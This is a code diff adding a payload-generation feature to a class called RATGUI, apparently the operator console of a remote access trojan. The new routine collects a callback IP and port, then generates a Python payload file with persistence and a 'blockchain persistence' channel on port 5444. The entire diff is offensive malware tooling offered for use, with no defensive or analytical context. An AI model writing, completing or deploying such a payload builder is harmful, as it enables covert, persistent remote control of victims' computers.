@@ -527,8 +527,59 @@ class RATGUI:
         self.refresh_sessions()
         
     def generate_payload(self):
-        """Generate payload (placeholder)"""
-        self.log("Payload generation not implemented yet.", "INFO")
+        """Generate payload with blockchain persistence"""
+        from payload_generator import PayloadGenerator
+        
+        # Get configuration from user
+        server_ip = simpledialog.askstring("Server IP", "Enter server IP address:", 
+                                          initialvalue="127.0.0.1")
+        if not server_ip:
+            return
+        
+        server_port = simpledialog.askinteger("Server Port", "Enter server port:", 
+                                             initialvalue=self.port)
+        if not server_port:
+            return
+        
+        output_file = filedialog.asksaveasfilename(
+            title="Save Payload As",
+            defaultextension=".py",
+            filetypes=[("Python Files", "*.py"), ("All Files", "*.*")]
+        )
+        
+        if not output_file:
+            return
+        
+        try:
+            # Generate payload
+            gen = PayloadGenerator()
+            result = gen.generate_payload(
+                server_ip=server_ip,
+                server_port=server_port,
+                output_file=output_file,
+                persistence=True,
+                blockchain_enabled=True,
+                blockchain_host=server_ip,
+                blockchain_port=5444
+            )
+            
+            self.log(f"Payload generated successfully!", "SUCCESS")
+            self.log(f"Session ID: {result['session_id']}", "INFO")
+            self.log(f"Output: {result['output_file']}", "INFO")
+            self.log(f"Blockchain: {result['blockchain_enabled']}", "INFO")
+            
+            messagebox.showinfo(
+                "Payload Generated",
+                f"Payload generated successfully!\n\n"
+                f"Session ID: {result['session_id']}\n"
+                f"File: {result['output_file']}\n\n"
+                f"Blockchain persistence enabled.\n"
+                f"Start blockchain server on port 5444."
+            )
+            
+        except Exception as e:
+            self.log(f"Failed to generate payload: {e}", "ERROR")
+            messagebox.showerror("Error", f"Failed to generate payload:\n{e}")
         
     def handle_server_event(self, event_type, data):
         """Handle events from the server thread"""
